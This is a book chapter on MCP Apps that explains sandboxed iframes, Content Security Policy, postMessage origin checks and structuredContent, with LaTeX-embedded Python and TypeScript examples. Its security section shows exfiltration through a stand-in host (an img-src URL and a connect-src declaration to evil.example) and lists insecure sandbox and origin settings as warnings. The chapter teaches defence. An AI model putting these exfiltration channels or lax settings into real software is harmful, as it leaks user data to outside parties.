\chapter{MCP Apps: Interactive Interfaces}
\label{ch:apps}

\epigraph{``Pay no attention to that man behind the curtain.''}{The Wizard,
\emph{The Wizard of Oz} (1939)}

An MCP App is HTML that a server sends you, that your host renders, and that
your user clicks on. The user sees a button. The server decides both what the
button does and what the button says it does, and those two things being under
one party's control is the entire security content of this chapter.

The same tension runs through the rest of it. Interactive interfaces are
genuinely the right answer for some tool results and genuinely dangerous, and
both of those facts have the same cause, which is that the markup arrived from
somebody else's server. So: when an app beats a paragraph of text, and what a
host has to do before rendering one is safe.

\section{The problem}

Tool results are text. Sometimes text is wrong.

A user asks to see risk across a portfolio. You could return a list of forty
accounts with scores, and the model could summarise it, and the user could ask
follow-up questions one at a time, each costing a full loop iteration and around
440 milliseconds. Or you could render a sortable table where they click a column
header and get their answer in 50 milliseconds with no model turn at all.

The second one is better, and it is better for a reason worth stating precisely:
\textbf{interactive exploration does not consume the context budget}. Every
click in a rendered table is a question that never became a prompt.

\section{How it works}

MCP Apps is the first official extension, identified as
\texttt{io.modelcontextprotocol/ui}. Five moving parts.

\textbf{1. A tool declares a UI} in its metadata:

\begin{py}
@server.tool(
    "assess_account_risk",
    "Score one commercial account for credit risk...",
    { ...inputSchema... },
    output_schema={ ... },
    annotations={"readOnlyHint": True, "idempotentHint": True},
    ui_resource_uri="ui://meridian/risk-dashboard",
)
def assess_account_risk(ctx: RequestContext):
    ...
\end{py}

which serialises into the tool definition as:

\begin{wire}
{
  "name": "assess_account_risk",
  "description": "...",
  "inputSchema": { ... },
  "_meta": { "ui": { "resourceUri": "ui://meridian/risk-dashboard" } }
}
\end{wire}

\textbf{2. The template lives at a \texttt{ui://} resource}, served like any
other resource with a MIME type that says what it is:

\begin{py}
@server.resource(
    "ui://meridian/risk-dashboard",
    "Risk dashboard",
    description="MCP App template for interactive drill-down.",
    mime_type="text/html;profile=mcp-app",
    ttl_ms=86_400_000,
    cache_scope="public",
)
def dashboard(ctx: RequestContext, uri: str):
    return DASHBOARD_HTML
\end{py}

\textbf{3. The host renders it in a sandboxed iframe}, with a Content Security
Policy built from origins the server declared. The default is no network at all.

\textbf{4. The app talks to the host over \texttt{postMessage}}, in a JSON-RPC
dialect. Some methods are shared with core MCP (\texttt{tools/call}), some are
new and prefixed \texttt{ui/}.

\textbf{5. \texttt{structuredContent} feeds the app} rather than the model. The
data the app renders never has to enter the context window.

\subsection{Predeclaration is the performance story}

The template URI is in the tool \emph{definition}, which the host fetched during
\texttt{tools/list}, which happened long before the tool was called.

That gives the host three things it could not otherwise have:

\begin{description}[leftmargin=1.4em, style=nextline, itemsep=3pt]
\item[Prefetch] Fetch and parse the template during idle time, so the first render is instant.
\item[Cache] Meridian's template carries a 24-hour TTL and
\texttt{cacheScope: public}. It is identical for every user, so a shared gateway
can serve it, and a returning user never fetches it at all.
\item[Security review] Read the HTML, check the declared CSP origins, and decide
whether to render it \emph{before} any tool runs. A host that fetches templates
lazily is deciding whether to trust code at the worst possible moment.
\end{description}

That third one is the real argument. Predeclaration is not primarily a latency
optimisation, it is what makes review possible at all.

\section{The security contract}

Now the part that should make you sit up. A server is sending you HTML, and you
are going to execute it.

\bookfig[0.98]{apps-security}{What the sandbox blocks, and the one channel it
leaves open. The box at the bottom is the rule everything else depends
on.}{apps-security}

\subsection{What the sandbox guarantees}

The iframe cannot reach the parent DOM, cannot read the host's cookies or local
storage, cannot navigate the parent page, and cannot execute in the parent
context. Standard browser sandboxing, doing what it was designed for.

Two mechanisms produce that, and they are worth separating because they fail
independently.

\textbf{The \texttt{sandbox} attribute} on the iframe. By default it removes
almost everything: scripts, forms, popups, top-level navigation, and, crucially,
the frame's origin. A sandboxed frame gets a unique opaque origin, which is what
makes it a stranger to the parent page rather than a colleague.

An app needs JavaScript, so the host adds \texttt{allow-scripts} back. What it
must never add alongside it is \texttt{allow-same-origin}:

\begin{plain}
sandbox="allow-scripts"                      the app runs, isolated
sandbox="allow-scripts allow-same-origin"    the sandbox is now decorative
\end{plain}

Those two together give the frame back the parent's origin \emph{and} the
ability to run code in it, which is precisely the combination the sandbox
existed to prevent. The frame can then reach into the parent document, read
storage, and remove its own sandbox attribute for good measure. The browser
warns about this pairing in the console and permits it anyway, and it is the
single most common way a sandbox turns out to have been decoration.

\textbf{A Content Security Policy}, which controls what the frame may talk to.

\subsection{CSP, for people who have not written one}

A Content Security Policy is a list of directives, each naming a class of
resource and the origins that class may come from. The browser enforces it,
which is what makes it worth anything: an app cannot opt out of a policy applied
to it.

The directives that matter here:

\begin{table}[htbp]
\centering
\small
\begin{tabularx}{\textwidth}{@{}lX@{}}
\toprule
\thead{Directive} & \thead{Governs} \\
\midrule
\texttt{connect-src} & \texttt{fetch}, XHR, WebSocket, \texttt{sendBeacon}. The exfiltration directive \\
\texttt{script-src}  & Where executable code may be loaded from \\
\texttt{style-src}   & Stylesheets \\
\texttt{img-src}     & Images, which are a data channel too: a URL is a GET \\
\texttt{frame-src}   & Nested frames \\
\texttt{default-src} & The fallback for anything not named above \\
\bottomrule
\end{tabularx}
\caption{A deny-by-default policy sets \texttt{default-src 'none'} and then adds
back only what the app demonstrably needs.}
\label{tab:csp-directives}
\end{table}

The host builds the policy, starting from deny-everything and adding the origins
the server declared in \texttt{\_meta.ui.csp}. So an app that wants a charting
library from a CDN must say so in advance, in a field a human reads during
review, rather than discovering the need at runtime and reaching for it.

\begin{wire}
"_meta": {
  "ui": {
    "resourceUri": "ui://meridian/risk-dashboard",
    "csp": { "connect-src": ["https://api.meridian.example"] }
  }
}
\end{wire}

Note which directive the exfiltration lives behind. An app that renders account
data and declares \texttt{connect-src} to an origin you do not recognise has
asked you, in writing, for permission to send that data somewhere. And
\texttt{img-src} is the one people forget: setting an image source to
\texttt{https://evil.example/?d=<data>} is a GET request with a payload, and no
\texttt{connect-src} entry is involved.

Meridian's template needs none of this. It has no external assets, so its policy
is deny-everything, and its only channel to the world is the one described
below.

\subsection{The rule that everything else rests on}

\keyidea{A tool call initiated from inside the app traverses the host's normal
consent and audit path. Exactly the same path as a call the model asked for. No
shortcut, no fast lane, no exception for being inside the host already.}

This is the one people are tempted to break, because it is annoying. The user
clicked a button in a UI they can see; asking them to confirm feels redundant.

It is not redundant. The button was rendered by HTML that arrived from a server,
and the server may be compromised, and the label on the button is under the
server's control while the action behind it is also under the server's control.
A button that says ``Refresh'' can call \texttt{transfer\_funds}. The host's
consent gate is the only thing that shows the user what is actually about to
happen.

Meridian's dashboard makes the round trip explicitly, with a comment for whoever
reads it next:

\begin{ts}
document.getElementById('refresh').addEventListener('click', async () => {
  // A tool call from the app travels the host's normal consent and audit
  // path. The iframe gets no shortcut just because it is inside the host.
  const r = await rpc('tools/call',
    { name: 'assess_account_risk', arguments: { accountId } });
  if (r && r.structuredContent) render(r.structuredContent);
});
\end{ts}

\begin{dangerbox}{The app attack surface, in full}
\textbf{Server-supplied HTML} is code you did not write, executing in your
users' browsers. Review the template, or at minimum pin and diff it.

\textbf{CSP declaration abuse.} A server declaring
\texttt{connect-src: https://evil.example} has requested an exfiltration
channel, in writing. Read the declaration before you honour it.

\textbf{\texttt{postMessage} abuse.} The bridge is the only channel, which makes
it the only thing to harden. Validate the origin of every message, and validate
the shape of every payload. An app that can send arbitrary JSON-RPC to the host
can call any tool.

\textbf{UI-initiated calls bypassing consent.} Covered above, and it is the one
that turns all the others from bad into catastrophic.
\end{dangerbox}

Chapter~\ref{ch:threats} treats this properly, including what an audit log has
to record to make an incident reconstructible.

\section{\texttt{structuredContent} and the context budget}

A tool result has two payloads. \texttt{content} is for the model.
\texttt{structuredContent} is for programs. An app reads the second one, and the
first one can be small.

\begin{wire}
{
  "content": [
    { "type": "text", "text": "ACC-1042 scored 55.4 (elevated)." }
  ],
  "structuredContent": {
    "accountId": "ACC-1042",
    "score": 55.4,
    "band": "elevated",
    "drivers": [
      { "factor": "leverage", "contribution": 24.7 },
      { "factor": "tenure", "contribution": -10.8 },
      { "factor": "priorDefaults", "contribution": 0.0 },
      { "factor": "scale", "contribution": -0.5 }
    ]
  }
}
\end{wire}

The model reads eleven words. The app renders the full driver breakdown. Neither
is short-changed, and the context window absorbs the smaller of the two.

Scale that up and the argument gets loud. A forty-account portfolio table is
maybe 6,000 tokens of JSON if it goes to the model. Delivered as
\texttt{structuredContent} to an app, with a one-line text summary for the model,
it is about 20.

\begin{notebox}{A naming trap}
\texttt{structuredContent} has nothing to do with ``structured outputs'' in the
LLM sense, where a model is constrained to emit schema-conforming JSON.

This is server-produced result data. Same word, unrelated concept. The
specification calls it out explicitly, which tells you how often people conflate
them.
\end{notebox}

\section{When an app beats text, and when it does not}

The honest table, because the failure mode here is building a dashboard for a
question with a one-word answer.

\begin{table}[htbp]
\centering
\small
\begin{tabularx}{\textwidth}{@{}XX@{}}
\toprule
\thead{An app earns its place} & \thead{Text is better} \\
\midrule
The user will ask follow-ups that are really filters (``show me only the C-tier ones'')
  & The answer is a number or a sentence \\
The data has more dimensions than a sentence can carry (a map, a heatmap, a diff)
  & The result feeds the next tool call rather than a human \\
Configuration with many interdependent options, where a form beats twelve turns of dialogue
  & The user is on a screen reader or a terminal \\
Real-time monitoring, where the alternative is asking ``what is it now'' repeatedly
  & The interaction is one-shot and the app would be seen once \\
Multi-step triage: examine, act, next, with state that persists across items
  & You would be reimplementing a table that renders fine as Markdown \\
\bottomrule
\end{tabularx}
\caption{The right-hand column is longer than people expect. Most tool results
should stay text.}
\label{tab:when-apps}
\end{table}

The test I use: \emph{would the user's next three questions be answered by
clicking, or by typing?} Clicking means an app. Typing means the model is doing
the work, and a UI is just something else to maintain.

\section{Building one}

Meridian's dashboard is deliberately vanilla: no framework, no build step, one
file. The bridge is about fifteen lines.

\begin{ts}
// Everything the app knows arrives through postMessage. It has no network of
// its own: the host builds a CSP from the server's declared domains, and the
// default is no network at all.
const rpc = (method, params) => new Promise(resolve => {
  const id = Math.random().toString(36).slice(2);
  const onMessage = (e) => {
    if (e.data && e.data.id === id) {
      window.removeEventListener('message', onMessage);
      resolve(e.data.result);
    }
  };
  window.addEventListener('message', onMessage);
  parent.postMessage({ jsonrpc: '2.0', id, method, params }, '*');
});
\end{ts}

The handshake and the render path:

\begin{ts}
window.addEventListener('message', (e) => {
  if (e.data && e.data.method === 'ui/render')
    render(e.data.params.structuredContent);
});

parent.postMessage({ jsonrpc: '2.0', id: 'init', method: 'ui/initialize',
                     params: { protocolVersion: '2026-01-26' } }, '*');
\end{ts}

Note that the app announces \emph{its} protocol version, \texttt{2026-01-26},
which is the Apps extension's own revision, not core MCP's. Extensions
version independently, as Chapter~\ref{ch:tasks} described, and this is what
that looks like in practice.

\subsection{What \texttt{postMessage} is, and where the check goes}

\texttt{postMessage} exists because the same-origin policy forbids two documents
from different origins touching each other's DOM, and yet they sometimes need to
talk. It is the one sanctioned hole: a document may send a structured-cloneable
value to another window, which receives it as an event.

It has two parameters that carry all the security, one on each side.

\textbf{Sending: \texttt{targetOrigin}.} The second argument to
\texttt{postMessage}. The browser delivers the message only if the receiving
document's origin matches, so passing your host's actual origin means a frame
that has been navigated somewhere unexpected receives nothing. Passing
\texttt{'*'} means deliver to whoever is there.

\textbf{Receiving: \texttt{event.origin}.} The property on the inbound event,
set by the browser and not by the sender, which is what makes it trustworthy.
Nothing checks it for you.

\begin{plain}
window.addEventListener('message', (e) => {
  if (e.origin !== EXPECTED_ORIGIN) return;   // the whole check
  handle(e.data);
});
\end{plain}

Omit those two lines in a host and any page that can get a handle on your window
can send you JSON-RPC. The bridge is the app's only channel to the outside, so
whatever can write to the bridge has the app's whole authority, and the app's
authority includes calling tools.

The asymmetry is worth stating plainly, because it decides where to spend your
care. An app that gets \texttt{targetOrigin} wrong leaks its own messages. A
host that skips \texttt{event.origin} accepts commands from anybody. The
receiving side is where the security is.

\begin{notebox}{On \texttt{targetOrigin: '*'}}
Meridian passes \texttt{'*'} because the host's origin is not known to a
template that may be rendered by any host.

In production, do better where you can. The host should pass its origin during
\texttt{ui/initialize} and the app should use it thereafter. And the host must
validate the origin of every inbound message regardless, because that side of
the check is the one that actually protects anybody.
\end{notebox}

Frameworks are entirely optional. The official examples ship starters for React,
Vue, Svelte, Preact, Solid, and vanilla JavaScript, and the \texttt{App} class
in \texttt{@modelcontextprotocol/ext-apps} is a convenience wrapper. It is postMessage and JSON-RPC underneath, which means the whole
web platform is available and none of it is mandatory.

\section{UX patterns worth copying}

\textbf{Render immediately, refine on arrival.} The host can prefetch the
template and even stream tool inputs into it before the result exists. Show
skeleton state, then fill it. Perceived latency is the latency.

\textbf{Keep the app and the conversation in sync.} A user who filters to C-tier
accounts in the app and then asks ``why are these risky'' expects the model to
know what ``these'' means. The app should push a context update; the host should
merge it. Without that, the app is a separate application that happens to be
drawn in the same window.

\textbf{Save state on teardown.} Apps get closed. If a user was three steps into
triage, losing that is worse than never having had it.

\textbf{Degrade to text.} Not every host renders apps. Your tool must still
return useful \texttt{content}, and it must stand on its own. A placeholder saying ``see the dashboard'' is a
broken tool. Meridian's tools all return complete
text results whether or not anything renders them.

\section{Measuring an app}

Three numbers worth watching, and only the first is obvious.

\textbf{Time to first render.} Template fetch, plus parse, plus paint. With
prefetch and a warm cache the fetch is zero and this is dominated by paint. Cold,
it is a full resource read on top.

\textbf{Tokens saved.} Compare the \texttt{content} you send with the
\texttt{structuredContent} you would have had to send if the model needed the
detail. That difference, times the number of turns after the call, is what the
app bought you.

\textbf{Interactions per model turn.} The real one. If users click eight times
between model turns, those are eight questions that cost nothing. If they click
once and then type, the app is not carrying its weight.

\begin{measurebox}{Meridian's dashboard template}
\begin{tabular}{@{}lr@{}}
\toprule
Template size                    & 2.6\,KB \\
Cache TTL                        & 24 hours \\
Cache scope                      & \texttt{public} \\
Fetches per user per day (warm)  & 0 \\
\texttt{content} tokens sent to the model & \textasciitilde{}11 \\
\texttt{structuredContent} rendered by the app & full driver breakdown \\
\bottomrule
\end{tabular}

\vspace{6pt}
\footnotesize
Template size from \texttt{meridian/servers/risk.py}; TTL and scope from its
resource declaration. The point of the table is the last two rows.
\end{measurebox}

\section{What to remember}

\begin{itemize}[leftmargin=1.6em, itemsep=3pt]
\item Apps is an extension, \texttt{io.modelcontextprotocol/ui}, negotiated like
any other.
\item Tools declare a template via \texttt{\_meta.ui.resourceUri}; templates live
at \texttt{ui://} resources.
\item Predeclaration lets the host prefetch, cache, and \emph{review} before any
tool runs. Review is the real benefit.
\item Sandboxed iframe. \texttt{allow-scripts} without
\texttt{allow-same-origin}, or the sandbox is decoration. Deny-by-default CSP,
and \texttt{connect-src} is the exfiltration directive.
\item Every UI-initiated tool call goes through the host's normal consent and
audit path. This rule is what makes the rest safe.
\item Validate \texttt{event.origin} on every inbound \texttt{postMessage}. The
receiving side is where the security is. \item \texttt{structuredContent} feeds
the app, \texttt{content} feeds the model, and that split is how an app saves
context.
\item Build an app when the next three questions are clicks. Otherwise return
text.
\item Always degrade gracefully. Not every host renders apps, and your text
result must stand alone.
\end{itemize}

That closes Part~II. You have the whole capability surface now: tools,
resources, prompts, multi round-trip requests, extensions with Tasks, and Apps.
Part~III builds something with them.
